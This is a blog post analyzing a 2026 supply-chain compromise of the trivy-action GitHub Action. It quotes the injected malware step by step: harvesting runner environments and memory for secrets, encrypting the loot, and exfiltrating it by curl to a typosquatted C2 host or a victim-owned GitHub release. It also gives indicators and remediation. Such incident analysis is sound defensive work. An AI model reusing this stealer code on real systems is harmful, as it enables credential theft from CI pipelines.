---
layout: post
title:  "How a Typosquatted Domain and a Fake Version Tag Turned Trivy Into a Credential Stealer"
tags: security supply-chain github-actions incident-response
---

On March 19, 2026, someone (or some group) poisoned the Aqua Security Trivy ecosystem. A tool that thousands of organizations rely on to find vulnerabilities in their container images and configurations was quietly turned into a weapon that stole their secrets instead. I spent some time pulling apart the malicious code and cross-referencing findings from [Wiz's analysis](https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack), and figured the walkthrough was worth sharing. Here's how it happened (and how a majority of the tech industry ignored the compromise because it was a Friday).

## Two Days of Preparation

The first sign of what was coming appeared on March 17, when someone registered the domain `aquasecurtiy.org` through Spaceship, Inc. It's "securtiy" with the `i` and `t` swapped, not "security." The `.org` TLD instead of `.com` added another layer of plausible misdirection.

Within fifty minutes of registration, the attacker had Let's Encrypt certificates issued for `scan.aquasecurtiy.org`. The server behind it sat on AS48090, a small network called DMZHOST operated by a UK-registered company with a Gmail abuse contact and IP space flagged to Andorra. The kind of hosting provider that doesn't ask too many questions about what you're running.

Two days of infrastructure prep. Then the real work began.

## A Legitimate Version, Silently Hijacked

`trivy-action` `0.34.2` was a real release. It shipped in late February with YAML trivyignore support and a Trivy version bump. Organizations adopted it through normal Renovate and Dependabot PRs weeks before anything went wrong.

According to [Wiz's research](https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack), the group behind this (calling themselves "TeamPCP") had compromised the `aqua-bot` service account through residual access from an earlier incident in March 2026 that was never fully contained. With that access, they didn't just tamper with one tag. They force-pushed 75 of 76 `trivy-action` tags and 7 `setup-trivy` tags to malicious commits. The `0.34.2` tag caused the most damage in the wild because so many organizations had already adopted it as a legitimate upgrade.

On March 19 around 17:43 UTC, the attacker moved the `0.34.2` tag. It had pointed to a clean commit; now it resolved to a different one (`ddb9da44`) that looked nearly identical to the original. Same author name, same timestamp, same commit message. The attacker had spoofed the commit metadata to impersonate legitimate Aqua developers (Wiz identified the handles `rauchg` and `DmitriyLewen`). The only differences were the parent chain (it branched off `v0.35.0` instead of sitting on the main branch) and the contents of `entrypoint.sh`, which now had 105 lines of malicious code prepended to the legitimate Trivy logic.

This is the fundamental problem with Git tags: they're just pointers. You can move them whenever you want, and anyone pulling that tag gets whatever it points to now, not what it pointed to yesterday. Every organization that had already pinned to `0.34.2` silently started pulling the attacker's code with no change on their end.

## Walking Through the Malicious Code

What makes this attack worth studying is its transparency. The 105 lines of malicious shell ran first, then handed off to the real Trivy scanner. Workflows completed successfully. Scans produced normal output. Nothing looked wrong unless you knew exactly where to look.

Here's the actual injected code.

### Phase 1: Harvesting Runner Process Environments

The first thing the payload does is find every GitHub Actions runner process on the box and read its environment variables straight out of `/proc`:

```bash
_COLLECT_PIDS="$"
for _name in Runner.Worker Runner.Listener runsvc run.sh; do
  _PIDS=$(pgrep -f "$_name" 2>/dev/null || true)
  [ -n "$_PIDS" ] && _COLLECT_PIDS="$_COLLECT_PIDS $_PIDS"
done

COLLECTED="/tmp/runner_collected_$.txt"
: > "$COLLECTED"

for _PID in $_COLLECT_PIDS; do
  _ENVIRON="/proc/${_PID}/environ"
  [ -r "$_ENVIRON" ] || continue
  while IFS= read -r line; do
    key="${line%%=*}"
    val="${line#*=}"
    if echo "$key" | grep -qiE '(env|ssh)'; then
      printf '%s=%s\n' "$key" "$val" >> "$COLLECTED"
      if [ -f "$val" ] && [ ! -S "$val" ]; then
        printf '\n[%s]\n' "$val" >> "$COLLECTED"
        cat "$val" >> "$COLLECTED"
        printf '\n' >> "$COLLECTED"
      fi
    fi
  done < <(tr '\0' '\n' < "$_ENVIRON")
done
```

It searches for four process names (`Runner.Worker`, `Runner.Listener`, `runsvc`, and `run.sh`) which cover every flavor of the GitHub Actions runner agent. For each one it finds, it reads `/proc/PID/environ`, which on Linux contains all of a process's environment variables as null-delimited bytes. The `tr '\0' '\n'` converts those null bytes into newlines so the shell can iterate over them.

Then it gets clever. It doesn't grab every variable. It filters for keys matching `env` or `ssh`, which catches things like `SSH_PRIVATE_KEY`, `ENV_FILE`, or anything a developer might have named with those substrings. And here's the part that shows someone thought about this: if the *value* of an environment variable is a path to a file on disk, the script reads that file's contents too. So if you have `SSH_KEY_PATH=/home/runner/.ssh/id_ed25519`, it doesn't just log the path. It cats the actual private key into the collection file.

### Phase 2: The Fork

After the environment harvest, the code branches based on where it's running:

```bash
if [[ "$(uname)" == "Linux" && "$RUNNER_ENVIRONMENT" == "github-hosted" ]]; then
    PYTHON_STR='aW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHJl...'
    MEMORY_SECRETS=$(echo -n "$PYTHON_STR" | base64 -d | sudo python3 | \
      tr -d '\0' | \
      grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u)
    printf '%s=%s\n' "MEMORY_PARSE" "$MEMORY_SECRETS" >> "$COLLECTED"
else
    PYTHON_STR='aW1wb3J0IG9zLHN5cyxzdGF0LHN1YnByb2Nlc3Ms...'
    SHELL_RUNNER_GOODIES=$(echo -n "$PYTHON_STR" | base64 -d | python3)
    printf '%s=%s\n' "SHELL_GOODIES" "$SHELL_RUNNER_GOODIES" >> "$COLLECTED"
fi
```

Both paths hide their real logic inside base64-encoded Python payloads, a straightforward way to avoid static detection from anyone grepping the action source for suspicious keywords.

**On GitHub-hosted runners**, the decoded Python does something audacious. It walks `/proc` looking for the `Runner.Worker` process, then reads its memory map from `/proc/PID/maps` to find all readable memory regions, and reads the raw bytes out of `/proc/PID/mem`. It runs under `sudo` because accessing another process's memory requires elevated privileges. The output gets piped through a regex that matches GitHub Actions' internal secret storage format: `"SECRET_NAME":{"value":"the_actual_secret","isSecret":true}`. That's how the runner keeps track of masked secrets in memory. Those `***` masks in your logs? The actual values are right there in the runner process's heap, and this script knows exactly what pattern to look for.

**On self-hosted runners**, the decoded Python is a comprehensive filesystem stealer. It's long (really long) because it has hardcoded paths for basically every credential file that might exist on a Linux machine. When decoded from base64, it defines helper functions for reading files (`emit`), running commands (`run`), and walking directory trees (`walk`), then systematically works through SSH keys and configs from every home directory and `/etc/ssh`, git credentials, AWS/GCP/Azure credentials, every flavor of `.env` file walking up to 6 directories deep, cloud IMDS endpoints for both ECS and EC2, Kubernetes configs and service account tokens, Docker configs (including the Kaniko-specific path at `/kaniko/.docker/config.json`), NPM tokens, Vault tokens, database credentials for MySQL/PostgreSQL/MongoDB/Redis, WireGuard configs, Terraform `.tfvars` and `.tfstate` files, TLS private keys, Slack and Discord webhook URLs, and cryptocurrency wallets for Bitcoin, Litecoin, Dogecoin, Zcash, Dash, Ripple, Monero, Ethereum, Cardano, and Solana. It also grabs `/etc/passwd`, `/etc/shadow`, and auth logs for good measure.

The script ends with the comment `## TeamPCP Cloud stealer`.

### Phase 3: Encrypt and Exfiltrate

Once the collection phase finishes, the payload only continues if it actually found something (`-s "$COLLECTED"` checks the file isn't empty). Then it sets up a hybrid encryption scheme:

```bash
if [ -s "$COLLECTED" ]; then
  _PUB_KEY_PEM="$(mktemp)"
  cat > "$_PUB_KEY_PEM" <<'PUBKEY'
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+
...
-----END PUBLIC KEY-----
PUBKEY

  _WORKDIR="$(mktemp -d)"
  _SESSION_KEY="$_WORKDIR/session.key"
  _ENC_FILE="$_WORKDIR/payload.enc"
  _ENC_KEY="$_WORKDIR/session.key.enc"
  _BUNDLE="$_WORKDIR/tpcp.tar.gz"

  openssl rand 32 > "$_SESSION_KEY" 2>/dev/null
  openssl enc -aes-256-cbc -in "$COLLECTED" -out "$_ENC_FILE" \
    -pass "file:$_SESSION_KEY" -pbkdf2 2>/dev/null
  openssl pkeyutl -encrypt -pubin -inkey "$_PUB_KEY_PEM" \
    -in "$_SESSION_KEY" -out "$_ENC_KEY" \
    -pkeyopt rsa_padding_mode:oaep 2>/dev/null
  tar -czf "$_BUNDLE" -C "$_WORKDIR" payload.enc session.key.enc 2>/dev/null
```

Textbook, a random 32-byte AES session key encrypts the collected data. Then the session key itself gets encrypted with the attacker's embedded RSA-4096 public key using OAEP padding. Both ciphertext files get tarred into `tpcp.tar.gz`. Only someone holding the corresponding RSA private key can reverse this. Even if you intercept the bundle on the wire, the contents are opaque.

### Phase 4: Phone Home (with a Backup Plan)

The exfiltration has a primary and fallback channel:

```bash
  _HTTP=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    https://scan.aquasecurtiy.org \
    -H "Content-Type: application/octet-stream" \
    -H "X-Filename: tpcp.tar.gz" \
    --data-binary "@${_BUNDLE}" 2>/dev/null || echo "000")

  if [[ ! "$_HTTP" =~ ^2 ]] && [ -n "${INPUT_GITHUB_PAT:-}" ]; then
    _REPO="tpcp-docs"
    _GH_AUTH="Authorization: token ${INPUT_GITHUB_PAT}"
    _GH_API="https://api.github.com"

    curl -s -X POST "${_GH_API}/user/repos" \
      -H "$_GH_AUTH" \
      -d '{"name":"'"${_REPO}"'","private":false,"auto_init":true}' \
      >/dev/null 2>&1 || true

    _GH_USER=$(curl -s -H "$_GH_AUTH" "${_GH_API}/user" 2>/dev/null \
      | grep -oE '"login"\s*:\s*"[^"]+"' | head -1 | sed 's/.*"\([^"]*\)"$/\1/')

    _TAG="data-$(date +%Y%m%d%H%M%S)"
    _RELEASE_ID=$(curl -s -X POST \
      "${_GH_API}/repos/${_GH_USER}/${_REPO}/releases" \
      -H "$_GH_AUTH" \
      -d '{"tag_name":"'"${_TAG}"'","name":"'"${_TAG}"'"}' \
      2>/dev/null | grep -oE '"id"\s*:\s*[0-9]+' | head -1 | grep -oE '[0-9]+')

    if [ -n "$_RELEASE_ID" ]; then
      curl -s -X POST \
        "https://uploads.github.com/repos/${_GH_USER}/${_REPO}/releases/${_RELEASE_ID}/assets?name=tpcp.tar.gz" \
        -H "$_GH_AUTH" \
        -H "Content-Type: application/octet-stream" \
        --data-binary "@${_BUNDLE}" >/dev/null 2>&1 || true
    fi
  fi

  rm -rf "$_WORKDIR" "$_PUB_KEY_PEM"
fi
rm -f "$COLLECTED"
```

First it tries the C2 directly, a POST to `scan.aquasecurtiy.org` over TLS, looking like any other HTTPS traffic. The `curl` captures the HTTP status code. If the server responds with a 2xx, the job is done.

But if the C2 is down, unreachable, or returns an error, and the workflow happens to have a GitHub PAT available (which `trivy-action` accepts as the `github-token` input), the fallback kicks in. It uses the victim's own PAT to create a public repository called `tpcp-docs` on the victim's GitHub account, creates a release tagged with the current timestamp, and uploads the encrypted bundle as a release asset. Your own credentials, exfiltrated through your own GitHub account, sitting in a public repo anyone can download from. The attacker just needs to watch for new `tpcp-docs` repos appearing on GitHub.

Wiz identified an additional fallback C2 at `plug-tab-protective-relay.trycloudflare.com` (a Cloudflare Tunnel), giving the attacker yet another exfiltration path if the primary domain went down.

Finally, cleanup. The temp directory, key files, and collection file all get deleted. The only trace left behind is whatever the runner's process table recorded, which, as it turns out, was enough.

## It Didn't Stop at CI

This is where Wiz's analysis adds a critical piece that isn't visible from the GitHub Actions side alone. The malicious `v0.69.4` trivy binary (not just the action, but the compiled CLI itself) had a second mode. When it detected it was running outside of GitHub Actions (`GITHUB_ACTIONS != "true"`), it dropped a Python script to `~/.config/systemd/user/sysmon.py` and created a systemd user unit to run it persistently. That script polled `tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io` (an ICP-hosted endpoint) every five minutes, downloading and executing whatever payload it received.

In other words: if a developer ran the compromised trivy binary locally (not in CI), they got a persistent backdoor installed on their workstation. The CI credential theft was the loud part of the attack. The quiet part was long-term access to developer machines.

The `aqua-bot` compromise also yielded GPG keys, Docker Hub credentials, Twitter account credentials, and Slack credentials for Aqua Security itself, which were exfiltrated to the Cloudflare Tunnel C2 endpoint.

## The Tell

The one thing the attacker couldn't fully hide was the exfiltration itself. The `curl` to the C2 ran as a background process while the legitimate Trivy scan continued in the foreground. When the GitHub Actions runner finished the job and cleaned up, it found this orphaned process still running and killed it:

```
Terminate orphan process: pid (2516) (curl)
```

That single log line, `Terminate orphan process ... (curl)`, was the smoking gun. Compromised runs showed between one and four orphan curl processes depending on how many matrix jobs were in the workflow. If your Trivy workflow doesn't use curl and you see that message in your logs from March 19, you have a problem.

## The Cleanup

On March 20, Aqua Security re-published all 74 `trivy-action` releases within a 78-minute window. Roughly 97 trivy CLI releases were deleted from GitHub (tags still exist, but the releases are gone). The `setup-trivy` action was stripped to a single version. The malicious `v0.69.4` CLI binary and the `0.34.2` tag were removed entirely.

The mass re-publishing means that for forensic purposes, the current tag-to-SHA mappings don't reflect what those tags pointed to during the attack window. If you need to know what your runners actually pulled, the answer is in your GitHub Actions run logs, specifically the `Download action repository` line that records the resolved SHA at execution time.

## Takeaways

The approximate exposure window was **2026-03-19 ~17:43 UTC through 2026-03-20 ~05:40 UTC**, roughly twelve hours. If you ran `trivy-action@0.34.2` during that window, assume every secret accessible to that workflow was exfiltrated and rotate accordingly.

**Stop using Trivy.** This isn't the first time Aqua Security's infrastructure has been compromised, and the `aqua-bot` account that enabled this attack was reportedly left exposed from a *previous* incident earlier in March that was never fully contained. That's not a one-off failure; it's an organizational pattern. A security scanning tool that can't secure its own supply chain is a liability, not an asset. Remove `trivy-action` from your workflows and the Trivy CLI from your toolchains.

**If you can't migrate immediately, pin by SHA.** Git tags are mutable. SHA-pinning is the only reference an attacker can't move:

```yaml
# Vulnerable
- uses: aquasecurity/trivy-action@v0.35.0

# Pinned (but you should still be migrating off Trivy)
- uses: aquasecurity/trivy-action@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v0.35.0
```

**Audit your dependency automation.** Renovate and Dependabot will happily adopt a version tag that was never part of an official release. If `0.34.2` doesn't appear in a project's changelog, something is wrong, but no bot is checking that. This is a systemic problem, but it's worse when the upstream project has already demonstrated it can't protect its own release infrastructure.

**Check for the persistence dropper.** If anyone on your team ran the `v0.69.4` trivy binary locally, look for `~/.config/systemd/user/sysmon.py` and its associated systemd unit. That machine needs to be treated as compromised. Wipe and rebuild; don't just remove the files.

Check your runner logs for orphan curl processes. Look for repositories named `tpcp-docs` on any GitHub account whose PAT was in scope. Block `scan.aquasecurtiy.org` and `45.148.10.212` at your network perimeter. As of this writing, the C2 is still live. And start planning your migration off Trivy today, not after the next compromise.

---

*The upstream incident is tracked at [aquasecurity/trivy#10425](https://github.com/aquasecurity/trivy/discussions/10425). Wiz's detailed analysis of the broader attack is available [here](https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack).*
